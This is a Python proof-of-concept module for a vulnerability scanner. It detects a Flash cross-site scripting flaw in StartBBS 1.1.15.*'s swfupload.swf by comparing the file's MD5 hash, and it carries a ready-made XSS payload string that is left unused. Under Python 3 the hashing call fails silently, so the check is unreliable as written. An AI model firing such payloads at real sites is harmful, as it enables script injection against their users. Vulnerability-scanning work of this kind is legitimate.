# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse
import hashlib

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0103'  # 平台漏洞编号，留空
    name = 'StartBBS /swfupload.swf 跨站脚本'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2014-09-22'  # 漏洞公布时间
    desc = '''
        Startbbs - a simple & lightweight Forum. ... Hello, world! StartBBS 是一款优雅、开源、轻量社区系统，基于MVC架构。
        StartBBS 1.1.15.* /plugins/kindeditor/plugins/multiimage/images/swfupload.swf Flash XSS.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.15.*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'daa17791-ccf7-490d-9014-25cb69bfd2b0'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
            file_path = "/plugins/kindeditor/plugins/multiimage/images/swfupload.swf"
            verify_url = self.target + file_path
            xss_poc = '?movieName="]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//'

            request = urllib.request.Request(verify_url)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            md5_value = hashlib.md5(content).hexdigest()
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
                # xss_url = verify_url + xss_poc
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
